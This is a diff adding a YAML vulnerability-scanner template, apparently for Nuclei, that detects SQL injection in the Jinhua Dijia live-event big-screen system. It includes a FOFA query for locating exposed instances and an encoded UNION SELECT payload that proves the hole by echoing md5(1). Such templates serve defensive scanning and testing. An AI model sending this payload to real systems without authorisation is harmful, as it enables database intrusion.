@@ -1,0 +1,30 @@
+id: jinhuadijia-ajax_act_get_data-sqli
+info:
+  name: 金华迪加现场大屏互动系统ajax_act_get_data存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/58465/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统" || body="/Modules/module.php?m=importlottery"||title="微信上墙首页"&&body="/wall/index.php"|| header="/frame.php"
+    tips:
+    repair:
+    version:
+  tags: jinhuadijia,sqli
+
+http:
+  - raw:
+      - |
+        GET /Modules/module.php?m=importlottery&c=admin&a=ajax_act_get_data&txt=%25%22%29%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2c%32%2c%33%2c%6d%64%35%28%31%29%2c%35%23 HTTP/1.1
+        Host: {{Hostname}}
+      
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'c4ca4238a0b923820dcc5')
+        condition: and
